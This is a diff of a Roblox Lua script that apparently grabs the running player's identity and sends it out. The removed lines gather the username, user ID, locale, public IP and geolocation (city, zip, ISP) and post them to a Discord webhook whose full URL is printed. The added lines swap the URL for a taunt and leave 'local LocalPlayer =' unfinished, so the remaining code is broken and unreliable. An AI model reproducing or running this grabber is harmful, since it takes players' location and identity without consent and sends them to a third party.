@@ -1,26 +1,4 @@
-local LocalPlayer = game:GetService("Players").LocalPlayer
-local HttpService = game:GetService("HttpService")
-
--- Player Info
-local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
-local Name = game.Players.LocalPlayer.Name -- Name
-local Userid = game.Players.LocalPlayer.UserId -- UserId
-local Country = game.LocalizationService.RobloxLocaleId -- Country
-local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
-local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-
-local IpFields = {
-    "query", -- IP address
-    "country", -- Country
-    "regionName", -- Region
-    "city", -- City
-    "zip", -- Zip code
-    "isp", -- ISP
-    "org", -- Organization
-    "as", -- Autonomous system
-}
-
-local IpInfoFields = {}
+local LocalPlayer = 
 for _, field in ipairs(IpFields) do
     if IpInfo[field] then
         IpInfoFields[field] = IpInfo[field]
@@ -49,7 +27,7 @@ local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "S
   or (identifyexecutor():find("ScriptWare") and "Script-Ware")
   or ("Shitty Exploit")
 
-local url = "https://discord.com/api/webhooks/1137232174261739560/_bKkSw9KqaII4a_uDrFKa4NTUOlkKKCboegM8u71VJzXoMWGpSa-ZbY5YeRGNJ8Utp8y"
+local url = "bro tought"
 
 local data = {
     ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
